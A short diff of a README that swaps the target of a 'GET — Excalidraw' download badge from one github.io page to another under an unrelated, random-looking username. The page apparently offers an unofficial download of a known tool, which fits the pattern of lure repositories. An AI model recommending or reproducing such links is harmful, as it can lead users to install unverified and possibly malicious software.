@@ -3,7 +3,7 @@
 
 ![Banner Placeholder](https://i.pinimg.com/736x/5a/43/a7/5a43a77678bc5fd19d398b2aa5628748.jpg)
 
-[![GET — Excalidraw](https://img.shields.io/badge/GET%20%E2%80%94%20Excalidraw-0078D6?style=for-the-badge&logoColor=white)](https://lisarodriguezj632.github.io/.github/Excalidraw-Drawing)
+[![GET — Excalidraw](https://img.shields.io/badge/GET%20%E2%80%94%20Excalidraw-0078D6?style=for-the-badge&logoColor=white)](https://osieelleholorasa.github.io/.github/Excalidraw-Drawing)
 
 ---
 
